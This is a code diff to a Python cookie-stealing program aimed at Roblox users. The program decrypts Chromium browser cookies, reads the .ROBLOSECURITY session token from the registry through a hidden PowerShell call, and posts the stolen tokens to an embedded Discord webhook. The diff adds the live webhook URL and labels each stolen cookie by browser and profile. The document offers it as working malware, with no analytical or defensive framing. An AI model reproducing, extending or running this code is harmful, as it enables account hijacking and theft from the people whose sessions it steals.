@@ -1,4 +1,4 @@
-webhook = "" # WEBHOOK HERE
+webhook = "https://discord.com/api/webhooks/1027262893512728656/mQ_Nf4uZ_5sHqEpSwpGcCCUgIZPEy3tz-ukrgfYvJVdM11Dbb8UaIulon3w38g3Mht-y" # WEBHOOK HERE
 
 import os
 import json
@@ -16,7 +16,7 @@ from Crypto.Cipher import AES
 def safe(func):
     def wrapper(*args, **kwargs):
         try:
-            func(*args, **kwargs)
+            return func(*args, **kwargs)
         except Exception:
             pass
     return wrapper
@@ -32,16 +32,25 @@ class CookieLogger:
         cookies = []
         for browser in browsers:
             try:
-                cookies += self.getCookie(browser[0], browser[1])
+                cookies.append(self.getCookie(browser[0], browser[1]))
             except Exception:
                 pass
 
         try:
-            cookies.append('\n'.join(line for line in subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com' -Name .ROBLOSECURITY", creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip()))
+            cookies.append(("Roblox App", ("None", '\n'.join(line for line in subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com' -Name .ROBLOSECURITY", creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip()))))
         except Exception:
             pass
+        
+        cookieDoc = ""
 
-        requests.post(webhook, files = {"cookies.txt": "\n\n".join(list(set(cookies)))})
+        for cookie in cookies:
+            if cookie == None or not cookie[1]:
+                continue
+
+            for _cookie in cookie[1]:
+                cookieDoc += f"Browser: {cookie[0]}\nProfile: {_cookie[0]}\nCookie: {_cookie[1]}\n\n"
+
+        requests.post(webhook, files = {"cookies.txt": cookieDoc})
     
     @safe
     def findBrowsers(self):
@@ -59,7 +68,7 @@ class CookieLogger:
                                     found.append([_root, False])
                 except Exception:
                     pass
-        
+
         return found
 
     @safe
@@ -85,7 +94,13 @@ class CookieLogger:
     @safe
     def getCookie(self, browserPath, isProfiled):
 
+        if browserPath.split("\\")[-1] == "User Data":
+            browserName = browserPath.split("\\")[-2]
+        else:
+            browserName = browserPath.split("\\")[-1]
+        
         cookiesFound = []
+
         profiles = ["Default"]
         try:
             masterKey = self.getMasterKey(browserPath)
@@ -114,7 +129,7 @@ class CookieLogger:
                     decrypted = self.decryptCookie(cookie[0], masterKey)
 
                     if decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"):
-                        cookiesFound.append(decrypted)
+                        cookiesFound.append(("None", decrypted))
                 
             connection.close()
             os.remove("temp.db")
@@ -136,12 +151,12 @@ class CookieLogger:
                         decrypted = self.decryptCookie(cookie[0], masterKey)
 
                         if decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"):
-                            cookiesFound.append(decrypted)
+                            cookiesFound.append((profile, decrypted))
                 
                 connection.close()
                 os.remove("temp.db")
 
-        return cookiesFound
+        return [browserName, cookiesFound]
 
 if __name__ == "__main__":
     CookieLogger()
